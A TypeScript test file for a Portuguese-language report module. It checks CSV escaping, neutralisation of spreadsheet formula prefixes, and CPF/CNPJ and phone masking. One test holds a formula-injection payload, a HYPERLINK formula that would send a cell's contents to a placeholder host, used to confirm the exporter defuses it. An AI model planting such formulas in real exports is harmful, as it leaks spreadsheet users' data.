import { describe, expect, test } from "bun:test";

import {
  fmtDocumento,
  fmtTelefone,
  relatorioParaCSV,
  type ResultadoRelatorio,
  type TipoRelatorio,
} from "@/lib/relatorios-store";

function resultado(
  colunas: string[],
  linhas: (string | number)[][],
  tipo: TipoRelatorio = "familias",
): ResultadoRelatorio {
  return {
    tipo,
    tituloRelatorio: "Teste",
    colunas,
    linhas,
    totalRegistros: linhas.length,
    dataHoraGeracao: "2026-02-01T00:00:00.000Z",
    usuarioGerador: "teste",
    filtrosAplicados: {},
  };
}

const BOM = "﻿";

describe("relatorioParaCSV", () => {
  test("gera cabeçalho + linhas com BOM e CRLF", () => {
    const csv = relatorioParaCSV(resultado(["Nome", "Idade"], [["Ana", 30]]));
    expect(csv).toBe(`${BOM}Nome;Idade\r\nAna;30`);
  });

  test("escapa campos com ponto e vírgula entre aspas", () => {
    const csv = relatorioParaCSV(resultado(["Obs"], [["a; b"]]));
    expect(csv).toBe(`${BOM}Obs\r\n"a; b"`);
  });

  test("duplica aspas internas e envolve o campo", () => {
    const csv = relatorioParaCSV(resultado(["Obs"], [['diz "oi"']]));
    expect(csv).toBe(`${BOM}Obs\r\n"diz ""oi"""`);
  });

  test("campos simples não são escapados", () => {
    const csv = relatorioParaCSV(resultado(["A", "B"], [["x", "y"]]));
    expect(csv).toBe(`${BOM}A;B\r\nx;y`);
  });

  test("neutraliza célula que a planilha avaliaria como fórmula", () => {
    const csv = relatorioParaCSV(resultado(["Nome"], [["=1+1"]]));
    expect(csv).toBe(`${BOM}Nome\r\n'=1+1`);
  });

  test("neutraliza todos os prefixos de fórmula", () => {
    const csv = relatorioParaCSV(resultado(["V"], [["+1"], ["-1"], ["@SUM(A1)"], ["\t=1"]]));
    // O tab não é delimitador neste CSV (separador é `;`), então a célula é
    // neutralizada sem precisar de aspas.
    expect(csv).toBe(`${BOM}V\r\n'+1\r\n'-1\r\n'@SUM(A1)\r\n'\t=1`);
  });

  test("neutraliza o payload e ainda escapa o ponto e vírgula", () => {
    const csv = relatorioParaCSV(resultado(["Nome"], [['=HYPERLINK("http://x/?d="&A2;"Clique")']]));
    expect(csv).toBe(`${BOM}Nome\r\n"'=HYPERLINK(""http://x/?d=""&A2;""Clique"")"`);
  });

  test("números negativos continuam numéricos", () => {
    const csv = relatorioParaCSV(resultado(["Saldo"], [[-5]]));
    expect(csv).toBe(`${BOM}Saldo\r\n-5`);
  });

  test("texto legítimo não ganha apóstrofo", () => {
    const csv = relatorioParaCSV(
      resultado(["Nome", "Valor", "Vazio"], [["Ana Maria", "R$ 10,00", "—"]]),
    );
    expect(csv).toBe(`${BOM}Nome;Valor;Vazio\r\nAna Maria;R$ 10,00;—`);
  });
});

describe("fmtDocumento", () => {
  test("CPF de 11 dígitos ganha máscara (preserva zeros à esquerda no Excel)", () => {
    expect(fmtDocumento("00011122258")).toBe("000.111.222-58");
  });

  test("CNPJ de 14 dígitos ganha máscara", () => {
    expect(fmtDocumento("12345678000199")).toBe("12.345.678/0001-99");
  });

  test("valor já formatado fica intacto", () => {
    expect(fmtDocumento("000.111.222-58")).toBe("000.111.222-58");
  });

  test("outros tamanhos e vazio ficam como estão", () => {
    expect(fmtDocumento("123456")).toBe("123456");
    expect(fmtDocumento("")).toBe("");
  });
});

describe("fmtTelefone", () => {
  test("celular de 11 dígitos ganha máscara com DDD", () => {
    expect(fmtTelefone("11947445989")).toBe("(11) 94744-5989");
  });

  test("fixo de 10 dígitos ganha máscara com DDD", () => {
    expect(fmtTelefone("1136225989")).toBe("(11) 3622-5989");
  });

  test("valor já formatado ou de outro tamanho fica como está", () => {
    expect(fmtTelefone("(11) 94744-5989")).toBe("(11) 94744-5989");
    expect(fmtTelefone("947445989")).toBe("947445989");
    expect(fmtTelefone("")).toBe("");
  });
});
